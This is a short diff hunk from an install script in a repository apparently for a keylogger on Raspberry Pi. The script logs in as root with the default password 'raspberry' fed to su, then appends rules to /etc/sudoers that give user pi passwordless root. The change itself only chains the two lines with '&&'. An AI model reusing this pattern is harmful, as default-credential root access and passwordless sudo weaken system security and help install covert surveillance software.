@@ -8,7 +8,7 @@ base="https://raw.githubusercontent.com/castle-sam/nice-keylogger/dev/src/"
 # Totally expects the root user to be an unchanged Raspberry Pi
 su - root <<!
 raspberry
-echo "pi ALL=(ALL:ALL) ALL" >> /etc/sudoers
+echo "pi ALL=(ALL:ALL) ALL" >> /etc/sudoers &&
 echo "pi ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
 !
 
